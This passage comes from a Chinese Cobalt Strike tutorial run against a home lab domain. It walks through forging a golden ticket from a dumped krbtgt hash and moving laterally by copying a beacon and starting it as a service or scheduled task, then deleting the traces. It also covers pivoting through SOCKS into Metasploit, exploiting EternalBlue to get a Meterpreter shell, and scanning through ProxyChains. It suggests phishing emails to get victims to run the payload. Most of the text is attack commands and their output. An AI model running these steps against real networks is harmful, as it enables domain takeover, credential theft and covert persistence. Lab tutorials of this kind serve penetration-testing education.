   \_ rc4_md4           OK
   \_ rc4_hmac_nt_exp   OK
   \_ rc4_hmac_old_exp  OK
   \_ *Password replace @ 00000000017DA1E8 (16) -> null

beacon> powershell Invoke-Command -computer WinDC -ScriptBlock {whoami}
[*] Tasked beacon to run: Invoke-Command -computer WinDC -ScriptBlock {whoami}
[+] host called home, sent: 231 bytes
[+] received output:
teamssix\administrator
```

#### Kerberos 票据

查看有哪些 Kerberos 票据

```powershell
shell klist
```

除去 kerberos 票据

```powershell
kerberos_ticket_purge
```

加载 kerberos 票据

```powershell
kerberos_ticket_use [/path/to/file.ticket]
```

##### 黄金票据

黄金票据 Golden Ticket 是 KRBTGT 帐户的 Kerberos 身份验证令牌，KRBTGT 帐户是一个特殊的隐藏帐户，用于加密 DC 的所有身份验证令牌。然后黄金票据可以使用哈希传递技术登录到任何帐户，从而使攻击者可以在网络内部不受注意地移动。
**使用 mimikatz 伪造黄金票据需要：**
**1、目标的用户名及域名**
**2、域的 SID 值**
域的 SID 值即安全标识符 Security Identifiers，使用 whoami /user 命令可查看，注意不需要 SID 最后的一组数字。

```powershell
beacon> shell whoami /user
[*] Tasked beacon to run: whoami /user
[+] host called home, sent: 43 bytes
[+] received output:

用户信息
----------------

用户名        SID                                         
============= ============================================
teamssix\daniel S-1-5-21-5311978431-183514165-284342044-1000
```

因为不需要 SID 最后一组数字，所以这里要使用的 SID 也就是 S-1-5-21-5311978431-183514165-284342044

**3、DC 中 KRBTGT 用户的 NTLM 哈希**

DC 中 KRBTGT 用户的 NTLM 哈希可以通过 dcsync 或 hashdump 获得，下面的 hashdump 命令在域控制器的 SYSTEM 权限会话下运行。

```powershell
beacon> hashdump
[*] Tasked beacon to dump hashes
[+] host called home, sent: 82501 bytes
[+] received password hashes:
Administrator:500:aca3b435b5z404eeaad3f435b51404he:12cb161bvca930994x00cbc0aczf06d1:::
Guest:501:aca3b435b5z404eeaad3f435b51404he:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aca3b435b5z404eeaad3f435b51404he:z1f8417a00az34scwb0dc15x66z43bg1:::
daniel:1108:aca3b435b5z404eeaad3f435b51404he:12cb161bvca930994x00cbc0aczf06d1:::
```

Cobalt Strike 在 Access -> Golden Ticket 中可以打开生成黄金票据的界面。

![image-20240628162555995](26.Cobalt%20Strike%20%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/image-20240628162555995.png)

![image-20240628162559953](26.Cobalt%20Strike%20%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/image-20240628162559953.png)

信息填完之后，选择 Build，需要注意 Domain 需要填写成 FQDN 格式，即完全合格域名 Fully Qualified Domain Name ，也就是类似于 test.com 的格式。
此时可以通过 shell dir \\host\C$ 检查自己是否有权限，也可以使用 PowerShell 运行 whoami 查看自己是谁。

```powershell
beacon> powershell Invoke-Command -computer WinDC -ScriptBlock {whoami}
[*] Tasked beacon to run: Invoke-Command -computer WinDC -ScriptBlock {whoami}
[+] host called home, sent: 203 bytes
[+] received output:
test\administrator
```

## 远程代码执行

实现代码执行的四个步骤：
1、与目标建立信任关系
2、复制可执行文件到目标上
3、在目标上运行可执行文件
4、实现对目标的控制
以上是根据视频教程中直译的结果，个人感觉其实这一节叫横向移动的方法更为合适。
**创建可执行文件**
创建可执行文件可以在 Cobalt Strike 的 Attack -> Packages -> Windows Executable(s) 处进行创建。

如果用于内网中的横向移动，那么强烈建议使用 SMB Beacon，SMB Beacon 就是为了内网横向扩展渗透而设计的。
**上传可执行文件**
首先使用 Cobalt Strike 上的 upload 功能上传文件，接着复制文件到目标主机的其他位置。

```powershell
shell copy file.exe \\host\C$\Windows\Temp
```

```powershell
beacon> upload /root/beacon.exe
[*] Tasked beacon to upload /root/Desktop/beacon.exe as beacon.exe
[+] host called home, sent: 289302 bytes

beacon> shell copy beacon.exe \\WinTest\C$\Windows\Temp
[*] Tasked beacon to run: copy beacon.exe \\WinTest\C$\Windows\Temp
[+] host called home, sent: 72 bytes
[+] received output:
已复制         1 个文件。
```

**执行文件（方法一）**
1、生成 Windows Service EXE 并上传
2、在目标主机上创建一个服务
```powershell
shell sc \\host create name binpath= c:\windows\temp\file.exe
```

```powershell
beacon> shell sc \\wintest create beacon binpath= c:\windows\temp\beacon.exe
[*] Tasked beacon to run: sc \\wintest create beacon binpath= c:\windows\temp\beacon.exe
[+] host called home, sent: 93 bytes
[+] received output:
[SC] CreateService 成功
```

注：记住 binpath 路径
3、在目标主机上启动服务

```powershell
shell sc \\host start name
```

```powershell
beacon> shell sc \\wintest start beacon
[*] Tasked beacon to run: sc \\wintest start beacon
[+] host called home, sent: 56 bytes
[+] received output:
SERVICE_NAME: beacon 
        TYPE               : 10  WIN32_OWN_PROCESS  
        STATE              : 2  START_PENDING 
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 3816
        FLAGS              : 
        
beacon> link wintest
[*] Tasked to link to \\wintest\pipe\msagent_da00
[+] host called home, sent: 36 bytes
[+] established link to child beacon: 192.168.175.130
```

4、清除痕迹与服务

```
shell sc \\host delete name
```

```powershell
beacon> shell del beacon.exe
[*] Tasked beacon to run: del beacon.exe
[+] host called home, sent: 57 bytes

beacon> shell del \\wintest\C$\windows\temp\beacon.exe
[*] Tasked beacon to run: del \\wintest\C$\windows\temp\beacon.exe
[+] host called home, sent: 83 bytes

beacon> shell sc \\wintest delete beacon
[*] Tasked beacon to run: sc \\wintest delete beacon
[+] host called home, sent: 69 bytes
[+] received output:
[SC] DeleteService 成功
```

**执行文件（方法二）**
1、生成 Windows EXE 并上传，注意这里生成的 EXE 和方法一生成的 EXE 是不一样的类型，这里生成的是 Windows EXE，不是方法一中的Windows Service EXE
2、找到目标系统上的时间

```powershell
shell net time \\host
```

```powershell
beacon> shell net time \\windc
[*] Tasked beacon to run: net time \\windc
[+] host called home, sent: 49 bytes
[+] received output:
\\windc 的当前时间是 2020/8/30 14:54:09
命令成功完成。
```

3、创建一个计划任务

```powershell
shell at \\host HH:mm C:\path\to\bad.exe
```

```powershell
beacon> shell at \\windc 15:00 C:\windows\temp\beacon.exe
[*] Tasked beacon to run: at \\windc 15:00 C:\windows\temp\beacon.exe
[+] host called home, sent: 76 bytes
[+] received output:
新加了一项作业，其作业 ID = 1
```

4、当计划任务被执行时，执行 link hostname 即可上线主机

```powershell
beacon> link windc
[*] Tasked to link to \\windc\pipe\msagent_d76a
[+] host called home, sent: 34 bytes
[+] established link to child beacon: 192.168.175.144
```

**beacon 的自动操作**
前面说的两种执行文件的方法都需要往磁盘里上传文件，如果不想往磁盘中上传文件，也可以使用 beacon 的自动操作。

- 使用一个服务运行可执行文件

```powershell
psexec [target] [share] [listener]
```

- 使用一个服务运行 Powershell 单行程序

```powershell
psexec_psh [target] [listener]
```

- 通过 WinRM 运行 Powershell 单行程序

```powershell
winrm [target] [listener]
```

- 通过 WMI 运行 Powershell 单行程序

```powershell
wmi [target] [listener]
```

在 Cobalt Strike 的 viwe --> Targets 下，右击主机选择 Jump 也可以通过图形化的方式进行上述操作，这样也使得横向移动更加的简单。
接下来进行一下演示，目前手中有一个普通机器的管理员会话，我们先在这台机器上运行 net view 查看一下当前域环境中的主机信息。

```powershell
beacon> net view
[*] Tasked beacon to run net view
[+] host called home, sent: 104504 bytes
[+] received output:
List of hosts:
[+] received output:
 Server Name             IP Address                       Platform  Version  Type   Comment
 -----------             ----------                       --------  -------  ----   -------            
 WINDC                   192.168.175.144                  500       6.1      PDC    
 WINTEST                 192.168.175.130                  500       6.1
```

因为是自己本地搭建的测试环境，所以主机很少，可以看到当前域中有两台机器，再利用 PowerView 查找一下具有本地管理员访问权限的用户

```powershell
beacon> powershell-import PowerView.ps1
[*] Tasked beacon to import: PowerView.ps1
[+] host called home, sent: 101224 bytes

beacon> powershell Find-LocalAdminAccess
[*] Tasked beacon to run: Find-LocalAdminAccess
[+] host called home, sent: 329 bytes
[+] received output:
WinDC.teamssix.com
```

接下来在 WinDC 上运行 psexec，因为这里是 64 位的，所以选择 psexec64，之后监听选择一个 smb beacon，会话就选择已经上线的 wintest 主机的会话，并勾选使用当前会话的访问令牌。

## 转发

### SOCKS 代理转发

在进行转发操作之前，需要将当前会话改为交互模式，也就是说输入命令就被执行，执行 sleep 0 即为交互模式。

#### Socks

在当前 beacon 上可以右击选择 Pivoting --> SOCKS Server 设置一个 Socks4a 代理服务
或者使用命令 socks [port] 进行设置
使用命令 socks stop 关闭 Socks 代理服务
在 View --> Proxy Pivots 中可以看到已经创建的代理服务
![image-20240628162610946](26.Cobalt%20Strike%20%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/image-20240628162610946.png)

#### Metasploit 连接到 Socks 代理服务

- CS 中创建好代理后，在 Metasploit 中可以运行以下命令通过 beacon 的 Socks 代理进行通信

```
setg Proxies socks4:127.0.0.1:[port]
setg ReverseAllowProxy true
```
如果感觉上面命令比较长，还可以在 Proxy Pivots 界面中点击 Tunnel 按钮查看命令。

- 运行以下命令来停止

```
unsetg Proxies
```

setg 命令和 unsetg 表示在 metasploit 中全局有效，不用在每次选择模块后再重新设置。
**演示**
环境说明：
攻击机 IP：192.168.175.200
上线主机：外部IP 192.168.175.130、内部IP 192.168.232.133
攻击目标：192.168.232.0/24 地址段
当前已经上线了一个 IP 为 192.168.175.130 主机，通过 ipconfig 发现，该主机也在 192.168.232.0/24 地址段内。
但当前攻击机无法访问 232 的地址段，因此如果想对 232 段内的主机发起攻击，就可以采用将 192.168.175.130 作为跳板机访问的方式。
1、设置 socks 代理
开启交互模式

```
beacon> sleep 0
[*] Tasked beacon to become interactive
[+] host called home, sent: 16 bytes
```

开启 socks 代理

```
beacon> socks 9527
[+] started SOCKS4a server on: 9527
[+] host called home, sent: 16 bytes
```

以上操作也可以通过图形化的方式进行。
2、Metasploit 中进行设置
开启 Metasploit 后，运行 setg 命令

```
msf5 > setg Proxies socks4:192.168.175.200:9527
Proxies => socks4:192.168.175.200:9527
```

3、扫描 192.168.232.0/24 地址段中的 445 端口
这里作为演示，只扫描一下 445 端口

```
msf5 > use auxiliary/scanner/smb/smb_version msf5 
 
auxiliary(scanner/smb/smb_version) > set rhost 192.168.232.0/24 
rhost => 192.168.232.0/24 
 
msf5 auxiliary(scanner/smb/smb_version) > set threads 64 
threads => 64
 
msf5 auxiliary(scanner/smb/smb_version) > exploit 
use auxiliary/scanner/smb/smb_version  
[*] 192.168.232.0/24:445 - Scanned 44 of 256 hosts (17% complete) 
[*] 192.168.232.0/24:445 - Scanned 64 of 256 hosts (25% complete) 
[*] 192.168.232.0/24:445 - Scanned 110 of 256 hosts (42% complete) 
[*] 192.168.232.0/24:445 - Scanned 111 of 256 hosts (43% complete) 
[*] 192.168.232.0/24:445 - Scanned 128 of 256 hosts (50% complete) 
[+] 192.168.232.133:445 - Host is running Windows 7 Ultimate SP1 (build:7601) (name:WINTEST) (domain:TEAMSSIX) (signatures:optional) 
[+] 192.168.232.132:445 - Host is running Windows 2008 HPC SP1 (build:7601) (name:WINDC) (domain:TEAMSSIX) (signatures:required) 
[*] 192.168.232.0/24:445 - Scanned 165 of 256 hosts (64% complete) 
[*] 192.168.232.0/24:445 - Scanned 184 of 256 hosts (71% complete) 
[*] 192.168.232.0/24:445 - Scanned 220 of 256 hosts (85% complete) 
[*] 192.168.232.0/24:445 - Scanned 249 of 256 hosts (97% complete) 
[*] 192.168.232.0/24:445 - Scanned 256 of 256 hosts (100% complete) 
[*] Auxiliary module execution completed
```

4、发现利用
通过扫描发现在 192.168.232.0/24 地址段内，除了已经上线的 133 主机外，还有 132 主机也开放了 445 端口，且该主机为 Windows 2008 的操作系统，这里使用永恒之蓝作为演示。

```
msf5 > use exploit/windows/smb/ms17_010_eternalblue 
 
msf5 exploit(windows/smb/ms17_010_eternalblue) > set rhosts 192.168.232.132 
rhosts => 192.168.232.132 
msf5 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/meterpreter/bind_tcp 
payload => windows/x64/meterpreter/bind_tcp msf5 
 
exploit(windows/smb/ms17_010_eternalblue) > exploit  
[*] 192.168.232.132:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check [+] 192.168.232.132:445 - Host is likely VULNERABLE to MS17-010! - Windows Server 2008 HPC Edition 7601 Service Pack 1 x64 (64-bit) 
[*] 192.168.232.132:445 - Scanned 1 of 1 hosts (100% complete) 
[*] 192.168.232.132:445 - Connecting to target for exploitation. 
[+] 192.168.232.132:445 - Connection established for exploitation. 
[+] 192.168.232.132:445 - Target OS selected valid for OS indicated by SMB reply 
[*] 192.168.232.132:445 - CORE raw buffer dump (51 bytes) 
[*] 192.168.232.132:445 - 0x00000000 57 69 6e 64 6f 77 73 20 53 65 72 76 65 72 20 32 Windows Server 2 
[*] 192.168.232.132:445 - 0x00000010 30 30 38 20 48 50 43 20 45 64 69 74 69 6f 6e 20 008 HPC Edition 
[*] 192.168.232.132:445 - 0x00000020 37 36 30 31 20 53 65 72 76 69 63 65 20 50 61 63 7601 Service Pac 
[*] 192.168.232.132:445 - 0x00000030 6b 20 31 k 1 
[+] 192.168.232.132:445 - Target arch selected valid for arch indicated by DCE/RPC reply 
[*] 192.168.232.132:445 - Trying exploit with 12 Groom Allocations. 
[*] 192.168.232.132:445 - Sending all but last fragment of exploit packet 
[*] 192.168.232.132:445 - Starting non-paged pool grooming 
[+] 192.168.232.132:445 - Sending SMBv2 buffers 
[+] 192.168.232.132:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer. 
[*] 192.168.232.132:445 - Sending final SMBv2 buffers. 
[*] 192.168.232.132:445 - Sending last fragment of exploit packet! 
[*] 192.168.232.132:445 - Receiving response from exploit packet 
[+] 192.168.232.132:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)! 
[*] 192.168.232.132:445 - Sending egg to corrupted connection. 
[*] 192.168.232.132:445 - Triggering free of corrupted buffer. 
[*] Started bind TCP handler against 192.168.232.132:4444 
[*] Sending stage (201283 bytes) to 192.168.232.132 
[*] Meterpreter session 1 opened (0.0.0.0:0 -> 192.168.175.200:9527) at 2020-09-01 22:13:57 -0400 
[+] 192.168.232.132:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= 
[+] 192.168.232.132:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= 
[+] 192.168.232.132:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= 
 
meterpreter > ipconfig 
Interface 11 
============ 
Name : Intel(R) PRO/1000 MT Network Connection 
Hardware MAC : 00:0c:29:d3:6c:3d 
MTU : 1500 
IPv4 Address : 192.168.232.132 
IPv4 Netmask : 255.255.255.0 
IPv6 Address : fe80::a1ac:3035:cbdf:4872 
IPv6 Netmask : ffff:ffff:ffff:ffff::
```

### 使用 ProxyChains 进行代理转发

使用 ProxyChains 可以使我们为没有代理配置功能的软件强制使用代理

1. 开启一个 socks 代理服务
2. 配置 /etc/proxychains.conf 文件
3. 运行 proxychains + 待执行命令

**演示**
演示环境：
攻击机 IP：192.168.175.200
上线主机：外部IP 192.168.175.130、内部IP 192.168.232.133
攻击目标：192.168.232.0/24 地址段
1、设置 socks 代理
首先开启交互模式，之后开启 socks 代理

```
beacon> sleep 0 
[*] Tasked beacon to become interactive 
[+] host called home, sent: 16 bytes 
 
beacon> socks 9527 
[+] host called home, sent: 16 bytes 
[+] started SOCKS4a server on: 9527
```

2、配置 ProxyChains
在攻击机上，配置 /etc/proxychains.conf 文件的最后一行，根据当前攻击主机 IP 与设置的 Socks 端口，修改如下：

```
socks4 192.168.175.200 9527
```

3、开始使用 ProxyChains
根据上一节使用 Metasploit 的扫描可以知道，在 192.168.232.0/24 地址段中存在主机 192.168.232.132 ，接下来使用 nmap 扫描一下常见的端口，这里以 80,443,445,3389 作为演示。

```
proxychains nmap -sT -Pn 192.168.232.132 -p 80,443,445,3389
```

-sT：使用 TCP 扫描
-Pn：不使用 Ping
-p：指定扫描端口
注：不加上 -sT -Pn 参数，将无法使用 proxychains 进行代理扫描

```
> proxychains nmap -sT -Pn 192.168.232.132 -p 80,443,445,3389                       
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.14
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-07 23:05 EDT
[proxychains] Strict chain  ...  192.168.175.200:9527  ...  192.168.232.132:80  ...  OK
[proxychains] Strict chain  ...  192.168.175.200:9527  ...  192.168.232.132:445  ...  OK
[proxychains] Strict chain  ...  192.168.175.200:9527  ...  192.168.232.132:3389  ...  OK
[proxychains] Strict chain  ...  192.168.175.200:9527  ...  192.168.232.132:443 <--denied
Nmap scan report for 192.168.232.132
Host is up (0.19s latency).
 
PORT     STATE  SERVICE
80/tcp   open   http
443/tcp  closed https
445/tcp  open   microsoft-ds
3389/tcp open   ms-wbt-server
 
Nmap done: 1 IP address (1 host up) scanned in 14.35 seconds
```

通过扫描可以看到目标 80 端口是开放的，接下来使用 curl 作为对比示例。

```
> curl 192.168.232.132
curl: (7) Failed to connect to 192.168.232.132 port 80: No route to host
 
> proxychains curl 192.168.232.132
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.14
[proxychains] Strict chain  ...  192.168.175.200:9527  ...  192.168.232.132:80  ...  OK
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
……内容太多，此处省略……
```

### 反向转发

反向转发顾名思义就是和上一节中提到的转发路径相反，之前我们设置的代理是 CS服务端 --> 上线主机 --> 内网主机，反向转发则是 内网主机 --> 上线主机 --> CS服务端。
继续使用上面的演示环境，首先右击上线主机会话，选择 Pivoting --> Listener ，除了 Name 选项之外，CS 都会自动配置好，这里直接使用默认的配置信息。

![image-20240628162621346](26.Cobalt%20Strike%20%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/image-20240628162621346.png)

之后生成一个 Windows 可执行文件，选择上一步生成的监听器，如果目标是 64 位则勾选使用 x64 Payload 的选项。

![image-20240628162625188](26.Cobalt%20Strike%20%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/image-20240628162625188.png)

之后将该可执行文件在目标主机上执行即可，在现实环境中可以尝试使用钓鱼邮件的方式诱导目标执行。
当目标执行该文件后，就会发现当前不出网的 192.168.232.132 主机已经上线了。